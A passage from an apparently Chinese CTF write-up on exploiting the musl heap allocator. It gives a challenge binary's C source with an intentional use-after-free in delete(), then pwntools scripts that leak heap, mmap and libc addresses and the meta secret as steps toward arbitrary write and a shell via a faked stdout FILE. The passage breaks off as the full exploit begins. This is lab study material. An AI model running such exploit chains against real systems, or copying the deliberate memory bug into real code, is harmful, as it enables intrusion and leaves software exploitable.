class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">recvuntil</span><span class="params">(<span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">if</span> (read(<span class="number">0</span>, &amp;c, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="type">char</span> *)buf)[i] = c;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            ((<span class="type">char</span> *)buf)[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">readint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    recvuntil(&amp;buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_key</span><span class="params">(<span class="type">uint8_t</span> **key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> key_size = readint();</span><br><span class="line">    *key = <span class="built_in">calloc</span>(<span class="number">1</span>, key_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*key, key_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_value</span><span class="params">(<span class="type">uint8_t</span> **value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> value_size = readint();</span><br><span class="line">    *value = <span class="built_in">calloc</span>(<span class="number">1</span>, value_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*value, value_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> *key;</span><br><span class="line">    <span class="type">uint8_t</span> *value;</span><br><span class="line">    <span class="type">size_t</span> key_size;</span><br><span class="line">    <span class="type">size_t</span> value_size;</span><br><span class="line">    <span class="type">uint64_t</span> hash;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">// struct node *prev;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">2021</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">value_dump</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx:&quot;</span>, size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_MASK (HASH_SIZE - 1)</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">list_heads</span>[<span class="title">HASH_SIZE</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: store&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: query&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;option: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> node *<span class="title function_">lookup</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = key_hash(key, key_size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">struct</span> node *n = list_heads[h &amp; HASH_MASK]; n; n = n-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n-&gt;hash == h &amp;&amp; n-&gt;key_size == key_size &amp;&amp; !<span class="built_in">memcmp</span>(key, n-&gt;key, key_size)) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">node</span> =</span> <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">    node-&gt;key_size = read_key(&amp;node-&gt;key);</span><br><span class="line">    <span class="comment">// always insert to the head, don&#x27;t check duplicated entries</span></span><br><span class="line">    node-&gt;value_size = read_value(&amp;node-&gt;value);</span><br><span class="line">    node-&gt;hash = key_hash(node-&gt;key, node-&gt;key_size);</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> h = node-&gt;hash &amp; HASH_MASK;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span> =</span> list_heads[h];</span><br><span class="line">    list_heads[h] = node;</span><br><span class="line">    node-&gt;next = next;</span><br><span class="line">    <span class="comment">// node-&gt;prev = NULL;</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">query</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value_dump(n-&gt;value, n-&gt;value_size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> node **p = &amp;list_heads[n-&gt;hash &amp; HASH_MASK];</span><br><span class="line">        <span class="keyword">if</span> (*p == n || n-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// above condition is buggy</span></span><br><span class="line">            <span class="comment">// remove `n` from the linked list</span></span><br><span class="line">            <span class="keyword">while</span> (*p != n) &#123;</span><br><span class="line">                p = &amp;(*p)-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            *p = n-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// uaf: if `n` is at the tail of the linked list</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;value);</span><br><span class="line">        <span class="built_in">free</span>(n);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> op = readint();</span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                store();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                query();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>很好，一做题就废，跟着<code>sung3r</code>师傅的文章才一步一步的复现出来，这里就对<code>sung3r</code>的文章进行部分补充<br>需要注意：需要等<code>group</code>内所有<code>chunk</code>都处于<code>freed</code>或者<code>used</code>状态时，才会将<code>freed</code>状态的<code>chunk</code>转换成<code>avaliable</code><br>可以看到<code>query()</code>函数每次打印的数据是该哈希链表最外侧结点的数据，而插入结点则是将结点插入最内侧<br>可以看到<code>delete()</code>函数当<code>n</code>为哈希链表的尾部且该哈希链表的结点个数大于一个时，会跳过循环直接进行<code>free</code>，存在<code>UAF</code>漏洞<br>每次<code>store</code>时，都会申请<code>0x30</code>大小的空间来存储改结点的信息，该空间结构为：</p><img src="/2024/01/17/musl/6.png" class="" title="我的图图呢">  <p>交互脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># 默认为\n对应的hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>这里粘贴<code>sung3r</code>师傅关于<code>group</code>对<code>chunk</code>的管理策略：</p><ul><li><code>chunk</code>按照内存先后，依次分配</li><li><code>free</code>掉的<code>chunk</code>不能马上分配</li><li>需要等<code>group</code>内所有<code>chunk</code>都处于<code>freed</code>或者<code>used</code>状态时，才会将<code>freed</code>状态的<code>chunk</code>转换成<code>avaliable</code></li><li>分配<code>chunk</code>时，会将<code>user data</code>域用<code>\x00</code>初始化</li></ul><p>接下来即可利用堆风水来进行地址的泄露<br>我们首先申请随便申请一个堆块，来防止防止<code>free</code>掉<code>group</code>所有<code>chunk</code>时，将整个<code>group</code>内存归还给堆管理器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>我们来看看此时的<code>group</code>的情况：</p><img src="/2024/01/17/musl/7.png" class="" title="我的图图呢">  <p>可以发现，该存储<code>0x30</code>大小堆块的<code>group</code>最多可以存储<code>7</code>个堆块<br>接下来，除最后一个与第一个<code>chunk</code>，其余全部<code>free</code>掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><img src="/2024/01/17/musl/8.png" class="" title="我的图图呢">  <p>接下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>group的布局为：</p><img src="/2024/01/17/musl/9.png" class="" title="我的图图呢">  <p>再申请一个与’\n’同hash的chunk：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这个时候<code>’\n’</code>的哈希链表中就有两个元素，<code>group</code>的布局为：</p><img src="/2024/01/17/musl/10.png" class="" title="我的图图呢">  <p>此时将<code>key</code>为<code>’\n’</code>的堆块删除并将<code>group</code>未被使用的堆块全部<code>free</code>掉:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>由前面的分析可以知道，此时触发的<code>UAF</code>漏洞，被标为<code>UAF</code>的堆块即为<code>’\n’</code>堆块的<code>value</code>区域，我们可以通过将另一个堆块的<code>struct</code>结构体申请到这里，从而通过<code>query</code>函数访问<code>’\n’</code>来泄露出<code>value</code>的地址。此时<code>group</code>的布局为：</p><img src="/2024/01/17/musl/11.png" class="" title="我的图图呢">  <p>最后申请一个堆块泄露地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>group布局为：</p><img src="/2024/01/17/musl/12.png" class="" title="我的图图呢">  <p>同样，我们也能够用相同的策略将<code>libc</code>基地址等内存信息<code>leak</code>出来<br>leak代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br></pre></td></tr></table></figure><p>泄露出地址后，即可通过伪造<code>meta_area、meta、mem</code>来利用<code>unlink</code>，实现任意地址写，此时即可在<code>stdout</code>中写入<code>fake file</code>然后<code>getshell</code><br>即<code>2</code>次<code>free</code>掉自己伪造的<code>group</code>来实现任意地址分配<br>嘶，好像有点说不清，跟着<code>exp</code>一步一步调试即可知道详细原理<code>QWQ</code>，<code>unlink</code>的和<code>fsop</code>的原理上面有讲过(晚点补，如果有机会的话)<br>其实我感觉<code>meta</code>的伪造好像可以当成模板来使用？</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 